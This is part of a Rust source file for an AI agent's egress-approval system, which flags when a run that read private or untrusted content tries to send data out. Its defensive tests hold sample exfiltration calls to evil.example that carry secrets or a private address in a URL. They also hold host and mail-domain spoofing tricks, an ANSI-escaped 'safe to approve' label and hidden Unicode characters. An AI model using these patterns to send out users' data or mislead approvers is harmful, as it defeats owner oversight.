        }
        started = true;
        i += 1;
    }
    out
}

/// Byte length of trailing U+0020 / U+0009. Other spaces are already revealed.
fn trailing_ascii_ws(line: &str) -> usize {
    line.bytes()
        .rev()
        .take_while(|b| *b == b' ' || *b == b'\t')
        .count()
}

fn domain_of_addr(addr: &str) -> String {
    let addr = addr.trim();
    let addr = addr
        .rfind('<')
        .map_or(addr, |i| addr[i + 1..].trim_end_matches('>').trim());
    mailbox_domain(addr).unwrap_or_else(|| "unparseable address".to_owned())
}

/// Domain of one mailbox. A quoted local part may contain `@`; the domain is
/// the part after the closing quote. Anything else with more than one `@`,
/// or no `@`, is not a domain.
fn mailbox_domain(addr: &str) -> Option<String> {
    let domain = if let Some(rest) = addr.strip_prefix('"') {
        let mut end = None;
        let mut escaped = false;
        for (i, c) in rest.char_indices() {
            if escaped {
                escaped = false;
                continue;
            }
            match c {
                '\\' => escaped = true,
                '"' => {
                    end = Some(i);
                    break;
                }
                _ => {}
            }
        }
        let end = end?;
        if end == 0 {
            return None;
        }
        rest[end + '"'.len_utf8()..].strip_prefix('@')?
    } else {
        if addr.contains('"') {
            return None;
        }
        let (local, domain) = addr.split_once('@')?;
        if local.is_empty() || local.contains('@') || domain.contains('@') {
            return None;
        }
        domain
    };
    if domain.is_empty()
        || domain.contains([' ', '\t', '"', '<', '>', ',', ';'])
        || domain.starts_with('.')
    {
        return None;
    }
    Some(domain.to_owned())
}

/// JSON merged onto an approval card when a tainted run calls an egress tool.
///
/// The payload is the revealed, collapsed text every renderer shows. Counts
/// describe the text that would actually be sent.
#[cfg(test)]
pub(crate) fn egress_details(taint: &ContentTaint, name: &str, input: &Value) -> Option<Value> {
    let mut value = egress_record(taint, name, input)?;
    finalize_egress_record(&mut value);
    Some(value)
}

/// Card before the payload is revealed. Callers that add tool-injected lines
/// do that, then [`finalize_egress_record`].
pub(crate) fn egress_record(taint: &ContentTaint, name: &str, input: &Value) -> Option<Value> {
    if !taint.exposure.is_tainted() {
        return None;
    }
    let (host, payload, payload_kind) = egress_payload(name, input);
    let mut read: Vec<String> = taint.sources.clone();
    if taint.earlier > 0 {
        let word = if taint.earlier == 1 { "read" } else { "reads" };
        read.push(format!("and {} earlier {word}", taint.earlier));
    }
    let sources = if read.is_empty() {
        "untrusted or private content".to_owned()
    } else {
        read.join(", ")
    };
    let reason = format!("this run read {sources} and now wants to send data to {host}");
    Some(json!({
        "kind": "egress",
        "trust_folders": taint.trust_folders,
        "reason": reason,
        "reason_code": "egress",
        "read": read,
        "host": host,
        "payload": payload,
        "payload_kind": payload_kind,
    }))
}

/// A tool that starts a program keeps the egress card. The extra sentence is
/// why a waiver of egress does not cover it.
pub(crate) fn note_executes_on_egress(value: &mut Value) {
    let Some(obj) = value.as_object_mut() else {
        return;
    };
    let reason = obj
        .get("reason")
        .and_then(Value::as_str)
        .unwrap_or("")
        .to_owned();
    obj.insert(
        "reason".to_owned(),
        json!(format!(
            "{reason} This call also starts a program on this computer, so it asks every time, even when sending data after reads is allowed."
        )),
    );
    obj.insert("reason_code".to_owned(), json!("egress_executes"));
    obj.insert("executes".to_owned(), json!(true));
}

/// One plain sentence of what an action in the owner's connected browser will
/// do, written by the daemon (the model's text only fills the address).
pub(crate) fn owner_browser_action(name: &str, input: &Value) -> String {
    let tool = name.rsplit('/').next().unwrap_or(name);
    match input.get("url").and_then(Value::as_str) {
        Some(url)
            if matches!(
                tool,
                "browser_navigate" | "browser_tabs" | "browser_tab_new"
            ) =>
        {
            format!("open {url} in your browser")
        }
        _ => format!("use {tool} in your browser"),
    }
}

/// An action in the browser the owner connected asks only because the run also
/// read something private. The card says that in one sentence, names the site
/// a navigation goes to, and keeps the full payload below it.
pub(crate) fn note_owner_browser(value: &mut Value, name: &str, input: &Value) {
    let action = owner_browser_action(name, input);
    let server = name
        .strip_prefix("mcp:")
        .and_then(|rest| rest.split('/').next())
        .unwrap_or("the browser")
        .to_owned();
    let Some(obj) = value.as_object_mut() else {
        return;
    };
    let sources: String = obj
        .get("read")
        .and_then(Value::as_array)
        .map(|items| {
            items
                .iter()
                .filter_map(Value::as_str)
                .collect::<Vec<_>>()
                .join(", ")
        })
        .unwrap_or_default();
    if let Some(url) = input.get("url").and_then(Value::as_str) {
        obj.insert("host".to_owned(), json!(host_of_url(url)));
    }
    obj.insert("action".to_owned(), json!(action));
    obj.insert("browser".to_owned(), json!(server));
    let reason = if crate::browser_url::opens_non_public(name, input) {
        format!(
            "this is not a public web address (a file, this computer or your network), so it asks before it will {action} ({server})"
        )
    } else if sources.is_empty() {
        format!(
            "this run read private data and now wants to {action} ({server}): a web address or a page script could carry it out"
        )
    } else {
        format!(
            "this run read {sources}, which includes private data, and now wants to {action} ({server}): a web address or a page script could carry what it read"
        )
    };
    obj.insert("reason".to_owned(), json!(reason));
    obj.insert("reason_code".to_owned(), json!("egress_browser"));
}

/// Replace `payload` with the text the user can see, and record its real size.
pub(crate) fn finalize_egress_record(value: &mut Value) {
    let raw = value
        .get("payload")
        .and_then(Value::as_str)
        .unwrap_or_default()
        .to_owned();
    let shown = present_payload(&raw);
    let Some(obj) = value.as_object_mut() else {
        return;
    };
    obj.insert("payload".to_owned(), json!(shown.text));
    obj.insert("payload_lines".to_owned(), json!(shown.lines));
    obj.insert("payload_chars".to_owned(), json!(shown.chars));
    obj.insert("hidden_chars".to_owned(), json!(shown.hidden));
    obj.insert("payload_bytes".to_owned(), json!(raw.len()));
    obj.insert(
        "review_full_payload".to_owned(),
        json!(raw.len() > FULL_REVIEW_PAYLOAD_BYTES),
    );
}

/// Point the card at `host` and rewrite the reason line to match.
pub(crate) fn set_egress_host(value: &mut Value, host: &str) {
    let Some(obj) = value.as_object_mut() else {
        return;
    };
    let sources = obj
        .get("read")
        .and_then(Value::as_array)
        .map(|items| {
            items
                .iter()
                .filter_map(Value::as_str)
                .collect::<Vec<_>>()
                .join(", ")
        })
        .filter(|text| !text.is_empty())
        .unwrap_or_else(|| "untrusted or private content".to_owned());
    obj.insert("host".to_owned(), json!(host));
    obj.insert(
        "reason".to_owned(),
        json!(format!(
            "this run read {sources} and now wants to send data to {host}"
        )),
    );
}

/// Append daemon-written lines (a default profile, a search backend, a skill
/// body) to the raw payload, before it is revealed.
pub(crate) fn append_payload(value: &mut Value, extra: &str) {
    if extra.is_empty() {
        return;
    }
    let mut payload = value
        .get("payload")
        .and_then(Value::as_str)
        .unwrap_or_default()
        .to_owned();
    if !payload.is_empty() && !payload.ends_with('\n') {
        payload.push('\n');
    }
    payload.push_str(extra);
    if let Some(obj) = value.as_object_mut() {
        obj.insert("payload".to_owned(), json!(payload));
    }
}

/// Keep a tool's own card (schedule, and anything else with a `kind`) and put
/// the egress block beside it. A card with no details becomes the egress card.
pub(crate) fn merge_egress(details: &mut Option<Value>, egress: Value) {
    match details {
        None => *details = Some(egress),
        Some(value) => {
            if value.get("kind").and_then(Value::as_str) == Some("egress") {
                return;
            }
            if let Some(obj) = value.as_object_mut() {
                obj.insert("egress".to_owned(), egress);
            } else {
                *details = Some(egress);
            }
        }
    }
}

#[cfg(test)]
mod card_tests {
    use std::sync::Arc;

    use async_trait::async_trait;
    use builtin_tools::{
        BuiltinConfig, GateRequest, ScheduleCaller, ScheduleChange, ScheduleHost, SchedulePreview,
        ScheduleRequest, ScheduleView, ToolGate,
    };
    use secret_store::SecretStore;
    use serde_json::{Value, json};
    use tool_registry::{
        ContentClass, Effect, PermissionCategory, Platform, Tool, ToolContext, ToolError,
        ToolOutput, ToolRegistry, ToolSpec,
    };

    use super::{ContentTaint, egress_payload};

    #[test]
    fn a_browser_batch_is_judged_like_the_single_actions_it_contains() {
        let class = builtin_tools::classify("browser_act").unwrap();
        let typing = json!({"steps":[{"action":"fill","ref":"e1","text":"x"}]});
        let clicking = json!({"steps":[{"action":"click","ref":"e1"},{"action":"scroll","dy":9}]});
        assert!(super::call_can_egress("browser_act", class, &typing));
        assert!(!super::call_can_egress("browser_act", class, &clicking));
        // Unreadable input is the strict case.
        assert!(super::call_can_egress("browser_act", class, &json!({})));
        // Its allowance is bound to the page origin like the single page actions, and its
        // result is read as page content.
        assert!(crate::shared::is_page_action("browser_act"));
        assert_eq!(
            super::source_label("browser_act", &json!({})),
            "page the browser"
        );
    }

    #[test]
    fn a_shell_result_is_never_recorded_as_a_file_and_the_card_carries_codes() {
        assert_eq!(
            super::source_label("shell_run", &json!({})),
            "command output"
        );
        assert_eq!(
            super::source_label("something_new", &json!({})),
            "tool something_new"
        );
        let mut t = ContentTaint::default();
        t.note(
            tool_registry::ContentClass::untrusted_private(),
            &super::source_label("desktop_list_apps", &json!({})),
        );
        let mut card = super::egress_record(&t, "shell_run", &json!({"command": "ls"})).unwrap();
        assert_eq!(card["reason_code"], "egress");
        super::note_executes_on_egress(&mut card);
        assert_eq!(card["reason_code"], "egress_executes");
        assert_eq!(card["executes"], true);
    }

    #[test]
    fn an_owner_browser_card_says_what_happens_once_and_names_the_site() {
        let mut t = ContentTaint::default();
        t.note(tool_registry::ContentClass::untrusted(), "mcp playwright");
        t.note(
            tool_registry::ContentClass::private_read(),
            "file notes.txt",
        );
        let input = json!({"url": "https://example.com/start"});
        let name = "mcp:playwright/browser_navigate";
        let mut card = super::egress_record(&t, name, &input).unwrap();
        super::note_owner_browser(&mut card, name, &input);
        assert_eq!(card["reason_code"], "egress_browser");
        assert_eq!(card["host"], "example.com");
        assert_eq!(
            card["action"],
            "open https://example.com/start in your browser"
        );
        let reason = card["reason"].as_str().unwrap();
        assert!(reason.contains("file notes.txt") && reason.contains("private"));
        // The tool name is said once, in the sentence of what happens, not repeated.
        assert_eq!(reason.matches("browser_navigate").count(), 0, "{reason}");
        assert_eq!(
            super::owner_browser_action("mcp:playwright/browser_click", &json!({"ref": "e3"})),
            "use browser_click in your browser"
        );
    }

    #[test]
    fn skill_write_card_shows_the_verbatim_document_only_once() {
        let content = "---\nname: x\ndescription: d\n---\nUNIQUE_BODY\n";
        let (_, payload, _) =
            egress_payload("skill_write", &json!({"name": "x", "content": content}));
        assert!(payload.contains(content));
        assert_eq!(payload.matches("UNIQUE_BODY").count(), 1);
    }

    #[test]
    fn mixed_blank_and_trailing_whitespace_reports_each_character_kind() {
        let shown = super::present_payload("hello\t\n \t \t\nbye \t\t\n\t");
        assert!(
            shown.text.contains("trailing whitespace: 0 spaces, 1 tabs"),
            "{}",
            shown.text
        );
        assert!(
            shown.text.contains("1 blank lines: 2 spaces, 2 tabs"),
            "{}",
            shown.text
        );
        assert!(
            shown.text.contains("trailing whitespace: 1 spaces, 2 tabs"),
            "{}",
            shown.text
        );
        assert!(
            shown.text.ends_with("1 blank lines: 0 spaces, 1 tabs …]"),
            "{}",
            shown.text
        );
        let buried = super::present_payload(&format!("hello\n{}\nbye", " \t".repeat(2000)));
        assert!(
            buried.text.contains("2000 spaces, 2000 tabs"),
            "{}",
            buried.text
        );
        assert!(buried.text.contains("bye"));
    }

    #[test]
    fn browser_open_card_contains_every_transmitted_field() {
        let (_host, payload, kind) = egress_payload(
            "browser_open",
            &json!({
                "url": "https://evil.example/",
                "dialog": "accept",
                "prompt_text": "SECRET_DATA",
                "profile": "logged-in"
            }),
        );
        assert_eq!(kind, "url");
        assert!(payload.starts_with("https://evil.example/"), "{payload}");
        assert!(payload.contains("prompt_text: SECRET_DATA"), "{payload}");
        assert!(payload.contains("dialog: accept"), "{payload}");
        assert!(payload.contains("profile: logged-in"), "{payload}");
    }

    #[test]
    fn a_backslash_cannot_rename_the_destination_host() {
        let (host, payload, _) = egress_payload(
            "web_extract",
            &json!({"url": "https://evil.example\\@trusted.example/x"}),
        );
        assert!(
            host.contains("backslash"),
            "a backslash must say why the host was refused: {host}"
        );
        assert!(payload.contains("evil.example"), "{payload}");
        assert!(payload.contains("trusted.example"), "{payload}");
        let (host, _, _) =
            egress_payload("browser_open", &json!({"url": "https://evil.example/hook"}));
        assert_eq!(host, "evil.example");
        let (host, _, _) = egress_payload(
            "email_send",
            &json!({
                "to": "a@evil.example, b@trusted.example",
                "subject": "s",
                "body": "b"
            }),
        );
        assert!(host.contains("evil.example"), "{host}");
        assert!(host.contains("trusted.example"), "{host}");
    }

    #[test]
    fn the_card_keeps_the_most_recent_sources_and_bounds_labels() {
        let mut taint = ContentTaint::default();
        for i in 0..8 {
            taint.note(
                ContentClass::untrusted_private(),
                &format!("file junk{i}.txt"),
            );
        }
        taint.note(
            ContentClass::untrusted_private(),
            "file C:/Users/me/.ssh/id_rsa",
        );
        assert_eq!(taint.sources().len(), 8);
        assert_eq!(
            taint.sources().last().map(String::as_str),
            Some("file C:/Users/me/.ssh/id_rsa")
        );
        assert!(taint.sources().iter().all(|s| !s.contains("junk0")));
        assert_eq!(taint.earlier, 1);
        let card = super::egress_details(&taint, "web_search", &json!({"query": "q"})).unwrap();
        let reason = card["reason"].as_str().unwrap();
        assert!(reason.contains("id_rsa"), "{reason}");
        assert!(reason.contains("earlier read"), "{reason}");
        assert!(!reason.contains("junk0"), "{reason}");

        let mut capped = ContentTaint::default();
        capped.note(
            ContentClass::private_read(),
            &format!("file {}", "a".repeat(400)),
        );
        capped.note(
            ContentClass::private_read(),
            "file notes\u{1b}[2Jsafe to approve",
        );
        assert!(capped.sources()[0].chars().count() <= 120);
        assert!(!capped.sources()[1].contains('\u{1b}'));

        let mut deep = ContentTaint::default();
        let path = format!("file {}/id_rsa", "d".repeat(200));
        deep.note(ContentClass::private_read(), &path);
        let shown = &deep.sources()[0];
        assert!(shown.chars().count() <= 120, "{shown}");
        assert!(shown.contains("id_rsa"), "{shown}");
        assert!(shown.contains('\u{2026}'), "{shown}");
    }

    #[test]
    fn a_quoted_local_part_does_not_rename_the_mail_domain() {
        let (host, _, _) = egress_payload(
            "email_send",
            &json!({
                "to": "\"a@trusted.example\"@evil.example",
                "subject": "s",
                "body": "b"
            }),
        );
        assert_eq!(host, "evil.example");
        let (host, _, _) = egress_payload(
            "email_send",
            &json!({"to": "Ann <\"a@trusted.example\"@evil.example>", "subject": "s", "body": "b"}),
        );
        assert_eq!(host, "evil.example");
        let (host, _, _) = egress_payload(
            "email_send",
            &json!({"to": "not-an-address", "subject": "s", "body": "b"}),
        );
        assert!(host.contains("unparseable"), "{host}");
    }

    #[test]
    fn the_card_reveals_odd_characters_and_collapses_blank_runs() {
        let mut taint = ContentTaint::default();
        taint.note(ContentClass::private_read(), "file notes.txt");
        let query = format!("weather{}\n\n\nsecret", '\u{00A0}');
        let card = super::egress_details(&taint, "web_search", &json!({"query": query})).unwrap();
        let payload = card["payload"].as_str().unwrap();
        assert!(payload.contains("<U+00A0>"), "{payload}");
        assert!(!payload.contains('\u{00A0}'), "{payload}");
        assert!(payload.contains("secret"), "{payload}");
        assert!(payload.contains("blank lines"), "{payload}");
        assert_eq!(card["hidden_chars"], 1);
        assert!(card["payload_chars"].as_u64().unwrap() > 10);
    }

    #[test]
    fn hidden_characters_in_keys_and_nested_values_are_seen() {
        let nested = json!({"outer": {"in ner": ["a", {"k": format!("x{}", '\u{E0041}')}]}});
        assert!(super::input_hides_characters(&nested));
        assert!(super::input_forbids_egress(&nested));
        let mut map = serde_json::Map::new();
        map.insert(format!("q{}", '\u{202E}'), json!("weather"));
        assert!(super::input_forbids_egress(&Value::Object(map)));
        let space = json!({"query": format!("a{}", '\u{3000}')});
        assert!(!super::input_forbids_egress(&space));
        assert!(super::input_needs_a_card_to_show(&space));
        let emoji = json!({"query": format!("ok{}", '\u{FE0F}')});
        assert!(!super::input_forbids_egress(&emoji));
        assert!(!super::input_needs_a_card_to_show(&emoji));
    }

    struct AllowAll;

    #[async_trait]
    impl ToolGate for AllowAll {
        async fn authorize(&self, _req: &GateRequest) -> Result<(), String> {
            Ok(())
        }
    }

    struct NoSched;

    impl ScheduleHost for NoSched {
        fn list(&self, _: &ScheduleCaller) -> Result<Vec<ScheduleView>, String> {
            Err("unused".into())
        }
        fn preview(
            &self,
            _: &ScheduleCaller,
            _: &ScheduleChange,
        ) -> Result<SchedulePreview, String> {
            Err("unused".into())
        }
        fn discard(&self, _: &ScheduleCaller, _: &ScheduleChange, _: &str) {}
        fn create(&self, _: &ScheduleCaller, _: &ScheduleRequest) -> Result<ScheduleView, String> {
            Err("unused".into())
        }
        fn update(
            &self,
            _: &ScheduleCaller,
            _: &str,
            _: &ScheduleRequest,
        ) -> Result<ScheduleView, String> {
            Err("unused".into())
        }
        fn set_enabled(
            &self,
            _: &ScheduleCaller,
            _: &str,
            _: bool,
        ) -> Result<ScheduleView, String> {
            Err("unused".into())
        }
        fn delete(&self, _: &ScheduleCaller, _: &str) -> Result<ScheduleView, String> {
            Err("unused".into())
        }
    }

    #[test]
    fn every_egress_tool_schema_field_is_on_the_card() {
        let dir = tempfile::tempdir().unwrap();
        let registry = ToolRegistry::new();
        let mut cfg = BuiltinConfig::new(dir.path().to_path_buf(), Arc::new(AllowAll));
        cfg.web = Some(builtin_tools::web_tools::WebToolsConfig::default());
        let store = Arc::new(secret_store::MemoryStore::new());
        store.set("email/test", "password").unwrap();
        let copied = Arc::clone(&store);
        let secrets: Arc<dyn secret_store::SecretStore> = copied;
        let account = builtin_tools::connector_email::AccountConfig {
            name: "test".to_string(),
            address: "user@example.com".to_string(),
            username: String::new(),
            password: secret_store::SecretRef::new("email/test").unwrap(),
            imap: builtin_tools::connector_email::ImapSettings {
                host: "imap.example.com".to_string(),
                port: 993,
            },
            smtp: builtin_tools::connector_email::SmtpSettings {
                host: "smtp.example.com".to_string(),
                port: 465,
                security: builtin_tools::connector_email::SmtpSecurity::Implicit,
            },
            drafts_folder: "Drafts".to_string(),
            extra_root_pem: None,
            timeout_secs: 30,
            bot: None,
            allowed_senders: Vec::new(),
            identity: builtin_tools::connector_email::IdentitySettings::default(),
            kind: builtin_tools::connector_email::AccountKind::ImapSmtp,
            inbox_id: None,
        };
        cfg.email = Some(Arc::new(
            builtin_tools::connector_email::EmailConnector::new(
                vec![account],
                Arc::clone(&secrets),
            )
            .unwrap(),
        ));
        let _ = builtin_tools::register_builtin_tools(&registry, cfg);
        let host: Arc<dyn ScheduleHost> = Arc::new(NoSched);
        for tool in builtin_tools::schedule::tools(&host) {
            registry.register(tool);
        }
        register_extra_tools(dir.path(), &registry, &secrets);
        assert_every_schema_field(&registry);
        assert_injected_defaults(dir.path(), &registry);
    }

    fn register_extra_tools(
        dir: &std::path::Path,
        registry: &ToolRegistry,
        secrets: &Arc<dyn secret_store::SecretStore>,
    ) {
        doc_tools::register(registry, &doc_tools::DocToolsConfig::default());
        let _ = dev_tools::register(
            registry,
            &dev_tools::DevToolsConfig::new(vec![dir.to_path_buf()]),
        );
        let index = skills::SkillIndex::load_roots(skills::SkillRoots::from_data_dir(dir));
        for tool in skills::tools(&index) {
            registry.register(tool);
        }
        let spec = "\
openapi: 3.0.0
info: {title: t, version: '1'}
servers: [{url: 'https://api.example.com'}]
paths:
  /pets:
    get:
      operationId: listPets
      parameters:
        - {name: q, in: query, schema: {type: string}}
      responses: {'200': {description: ok}}
";
        let (api, imported) = openapi_tools::import_tools(
            spec,
            &openapi_tools::ImportOptions::default(),
            &openapi_tools::OpenApiConfig::new(Arc::clone(secrets)),
        )
        .unwrap();
        assert_eq!(api.base_url, "https://api.example.com");
        for tool in imported {
            registry.register(tool);
        }
        for (name, category) in [
            ("mcp:srv/echo", PermissionCategory::Fs),
            ("cli:echo", PermissionCategory::Shell),
        ] {
            registry.register(Arc::new(SchemaFixture {
                spec: ToolSpec {
                    name: name.into(),
                    description: "fixture".into(),
                    input_schema: json!({"type":"object","properties":{
                        "hidden_arg":{"type":"string"},
                        "prompt":{"type":"string"}
                    }}),
                    effect: Effect::Write,
                    category,
                    platforms: vec![Platform::All],
                    content: ContentClass::all(),
                },
            }));
        }
    }

    fn assert_every_schema_field(registry: &ToolRegistry) {
        let mut checked = 0usize;
        let mut saw_browser_open = false;
        for spec in registry.list() {
            if !spec.content.egress {
                continue;
            }
            let Some(props) = spec
                .input_schema
                .get("properties")
                .and_then(Value::as_object)
            else {
                continue;
            };
            if props.is_empty() {
                continue;
            }
            let input = Value::Object(
                props
                    .keys()
                    .map(|key| (key.clone(), Value::String(format!("SNTNL_{key}_END"))))
                    .collect(),
            );
            let (_host, payload, _) = egress_payload(&spec.name, &input);
            for key in props.keys() {
                let sentinel = format!("SNTNL_{key}_END");
                assert!(
                    payload.contains(&sentinel),
                    "{} hides `{key}`: {payload}",
                    spec.name
                );
            }
            if spec.name == "browser_open" {
                saw_browser_open = true;
            }
            checked += 1;
        }
        assert!(saw_browser_open, "browser_open was not in the audited set");
        assert!(checked > 8, "only {checked} egress tools were audited");
    }

    fn assert_injected_defaults(dir: &std::path::Path, registry: &ToolRegistry) {
        let ctx = ToolContext::default();
        let open = registry.get("browser_open").unwrap();
        let profile = open
            .egress_extra(&ctx, &json!({"url": "https://example.com"}))
            .unwrap();
        assert!(
            profile.contains("persistent per-bot profile") && profile.contains("may be logged in"),
            "{profile}"
        );
        let isolated = open
            .egress_extra(
                &ctx,
                &json!({"url": "https://example.com", "profile": "isolated"}),
            )
            .unwrap();
        assert!(isolated.contains("temporary, not logged in"), "{isolated}");
        let search = registry.get("web_search").unwrap();
        let backend = search
            .egress_extra(&ctx, &json!({"query": "weather"}))
            .unwrap();
        assert!(backend.contains("default chain:"), "{backend}");
        assert!(!backend.to_ascii_lowercase().contains("key"), "{backend}");
        let mail = registry.get("email_send").unwrap();
        let account = mail
            .egress_extra(
                &ctx,
                &json!({"to": ["a@b.co"], "subject": "s", "body": "b"}),
            )
            .unwrap();
        assert!(
            account.contains("from: user@example.com")
                && account.contains("account: test) (default)"),
            "{account}"
        );
        let note = dir.join("note.txt");
        std::fs::write(&note, "abcd").unwrap();
        let attached = mail
            .egress_extra(
                &ctx,
                &json!({
                    "to": ["a@b.co"],
                    "subject": "s",
                    "body": "b",
                    "attachments": [{"path": note, "filename": "note.txt"}]
                }),
            )
            .unwrap();
        assert!(
            attached.contains("attachment: note.txt, 4 bytes"),
            "{attached}"
        );
        let api_tool = registry.get("listPets").unwrap();
        assert_eq!(
            api_tool.egress_host(&json!({})).as_deref(),
            Some("api.example.com")
        );
        let mut tainted = ContentTaint::default();
        tainted.note(ContentClass::private_read(), "file notes.txt");
        let mut card = super::egress_record(&tainted, "listPets", &json!({"q": "x"})).unwrap();
        super::set_egress_host(&mut card, "api.example.com");
        assert_eq!(card["host"], "api.example.com");
        assert!(
            card["reason"].as_str().unwrap().contains("api.example.com"),
            "{card}"
        );
    }

    struct SchemaFixture {
        spec: ToolSpec,
    }

    #[async_trait]
    impl Tool for SchemaFixture {
        fn spec(&self) -> &ToolSpec {
            &self.spec
        }
        async fn call(&self, _: &ToolContext, _: Value) -> Result<ToolOutput, ToolError> {
            Ok(ToolOutput::text("ok"))
        }
    }
}

#[cfg(test)]
mod hashed_history_tests {
    use std::collections::HashSet;

    use serde_json::json;

    use super::*;

    fn write_step(path: &str) -> Value {
        json!({"tool_calls": [{
            "id": "c1",
            "name": "fs_write",
            "arguments": json!({"path": path, "content": "x"}).to_string()
        }]})
    }

    fn page_step() -> Value {
        json!({"results": [{"fact": {
            "ran": true, "ingests_untrusted": true, "reads_private": false, "label": "page https://x.example/"
        }}]})
    }

    #[test]
    fn a_rebuilt_run_remembers_code_written_after_an_untrusted_read() {
        // written before any page read: clean
        let mut taint = ContentTaint::default();
        observe_history_step(&mut taint, "model", &json!({}), Some(&write_step("x.sh")));
        observe_history_step(&mut taint, "tools", &json!({}), Some(&page_step()));
        assert!(!taint.code_written_after_untrusted);
        // a note after the read is inert, a script after the read marks the run
        observe_history_step(&mut taint, "model", &json!({}), Some(&write_step("a.md")));
        assert!(!taint.code_written_after_untrusted);
        observe_history_step(&mut taint, "model", &json!({}), Some(&write_step("x.sh")));
        assert!(taint.code_written_after_untrusted);
        // and a parent that absorbs the child keeps the mark
        let mut parent = ContentTaint::default();
        parent.inherit(&taint);
        assert!(parent.code_written_after_untrusted);
    }

    #[test]
    fn a_rebuilt_run_remembers_a_git_change_after_an_untrusted_read_but_not_a_listing() {
        let step = |name: &str, args: Value| json!({"tool_calls": [{"id": "c1", "name": name, "arguments": args.to_string()}]});
        for (name, args, marks) in [
            (
                "git_commit",
                json!({"paths": ["a.txt"], "message": "m"}),
                true,
            ),
            ("git_branch", json!({"action": "switch", "name": "x"}), true),
            ("git_branch", json!({"action": "create", "name": "x"}), true),
            ("git_branch", json!({"action": "list"}), false),
        ] {
            let mut taint = ContentTaint::default();
            observe_history_step(&mut taint, "tools", &json!({}), Some(&page_step()));
            observe_history_step(
                &mut taint,
                "model",
                &json!({}),
                Some(&step(name, args.clone())),
            );
            assert_eq!(taint.code_written_after_untrusted, marks, "{name} {args}");
        }
    }

    #[test]
    fn recalled_memory_of_a_resumed_run_is_hashed_not_unhashed() {
        let mut taint = ContentTaint::default();
        observe_history_step(
            &mut taint,
            "user_message",
            &json!({"text": "<recalled_memory>\nThe owner lives in Zurichstrasse.\n</recalled_memory>\nstart"}),
            None,
        );
        assert!(taint.private_source);
        assert!(!taint.seen.unhashed);
        let none = HashSet::new();
        assert!(
            taint
                .seen
                .copied("https://evil.example/?q=zurichstrasse", &none)
        );
        assert!(
            !taint
                .seen
                .copied("https://evil.example/?q=winter+coats", &none)
        );
    }

    #[test]
    fn a_stored_tool_result_is_hashed_unless_it_spilled() {
        let fact = json!({"ran": true, "reads_private": true, "label": "notes"});
        let step = |spill: Value| json!({"results": [{"text": "Zurichstrasse is the address", "spill_path": spill, "fact": fact}]});
        let mut hashed = ContentTaint::default();
        observe_history_step(&mut hashed, "tools", &json!({}), Some(&step(Value::Null)));
        assert!(hashed.private_source && !hashed.seen.unhashed);
        assert!(hashed.seen.copied("zurichstrasse", &HashSet::new()));
        let mut spilled = ContentTaint::default();
        observe_history_step(&mut spilled, "tools", &json!({}), Some(&step(json!("/x"))));
        assert!(spilled.private_source && spilled.seen.unhashed);
    }

    #[test]
    fn only_conversation_text_labels_can_be_compared() {
        for label in [
            "memory",
            "notes",
            "past conversation",
            "file notes.txt",
            "mailbox INBOX",
            "tool knowledge_search",
            "tool documents_search",
        ] {
            assert!(comparable_label(label), "{label}");
        }
        for label in [
            "signed-in browser",
            "window desktop",
            "attached file a.pdf",
            "another bot's answer",
            "mcp github",
            "tool something_new",
            "page https://a.example/",
        ] {
            assert!(!comparable_label(label), "{label}");
        }
        let mut taint = ContentTaint::default();
        taint.note_label_hashed("memory");
        assert!(taint.private_source && !taint.seen.unhashed);
    }
}

#[cfg(test)]
mod mail_review_tests {
    use protocol::PermissionCategory as C;
    use serde_json::json;
    use tool_registry::Effect;

    use super::*;

    /// A saved attachment is a stranger's file: the run counts as having written code even
    /// when it has read nothing untrusted yet, and a shell waiver then stops covering
    /// interpreters (`code_written_after_untrusted`).
    #[test]
    fn downloading_a_mail_attachment_marks_the_run_as_having_written_code() {
        let mut clean = ContentTaint::default();
        assert!(!clean.exposure.untrusted && !clean.code_written_after_untrusted);
        clean.note_write(
            "email_download_attachment",
            Effect::Write,
            C::Messaging,
            &json!({"uid": 1, "attachment_id": "0"}),
        );
        assert!(clean.code_written_after_untrusted);
        // Other mail tools that only touch the mailbox do not.
        for name in ["email_draft", "email_mark_read", "email_send"] {
            let mut t = ContentTaint::default();
            t.exposure.observe(true, false);
            t.note_write(name, Effect::Write, C::Messaging, &json!({}));
            assert!(!t.code_written_after_untrusted, "{name}");
        }
        // A rebuilt run (after a restart) judges it by name alone.
        let mut rebuilt = ContentTaint::default();
        rebuilt.note_write_from_history("email_download_attachment", "{}");
        assert!(rebuilt.code_written_after_untrusted);
    }

    #[test]
    fn the_attachment_card_names_the_mailbox_like_the_other_mail_reads() {
        assert_eq!(
            source_label("email_download_attachment", &json!({"folder": "Junk"})),
            "mailbox Junk"
        );
        assert_eq!(
            source_label("email_download_attachment", &json!({})),
            "mailbox INBOX"
        );
    }

    /// A reply leaves `to` and `subject` out and the mail tool fills them in. The card the tool
    /// built has them; the egress card must be made from those, not from the partial input.
    #[test]
    fn the_egress_card_of_a_reply_uses_the_recipients_the_tool_resolved() {
        let input = json!({"reply_to_uid": 7, "body": "Thanks!"});
        let (host, payload, _) = egress_payload("email_send", &input);
        assert_eq!(host, "unknown", "the model's input alone names nobody");
        assert!(payload.contains("To: \n") || !payload.contains("example.com"));

        let card = json!({
            "kind": "mail_send",
            "to": ["billing@elsewhere.test"],
            "cc": ["ann@example.com"],
            "bcc": [],
            "subject": "Re: Hello bot",
            "body": "Thanks!",
        });
        let sent = input_as_sent("email_send", &input, Some(&card));
        let (host, payload, _) = egress_payload("email_send", &sent);
        assert!(
            host.contains("elsewhere.test") && host.contains("example.com"),
            "{host}"
        );
        assert!(payload.contains("To: billing@elsewhere.test"), "{payload}");
        assert!(payload.contains("Subject: Re: Hello bot"), "{payload}");
        // The fields the model did write stay as they were.
        assert_eq!(sent["reply_to_uid"], 7);
        assert_eq!(sent["body"], "Thanks!");
    }

    #[test]
    fn only_a_mail_card_of_the_mail_send_tool_changes_what_is_checked() {
        let input = json!({"to": ["a@b.test"], "subject": "x", "body": "y"});
        let other_card = json!({"kind": "something_else", "to": ["z@z.test"]});
        let card = json!({"kind": "mail_send", "to": ["z@z.test"], "subject": "s"});
        // Not a mail card: unchanged.
        assert_eq!(
            input_as_sent("email_send", &input, Some(&other_card)),
            input
        );
        assert_eq!(input_as_sent("email_send", &input, None), input);
        // Not the mail tool: unchanged, whatever the card says.
        assert_eq!(input_as_sent("email_draft", &input, Some(&card)), input);
        assert_eq!(input_as_sent("web_extract", &input, Some(&card)), input);
        // A mail card replaces exactly what it names.
        let sent = input_as_sent("email_send", &input, Some(&card));
        assert_eq!(sent["to"], json!(["z@z.test"]));
        assert_eq!(sent["subject"], "s");
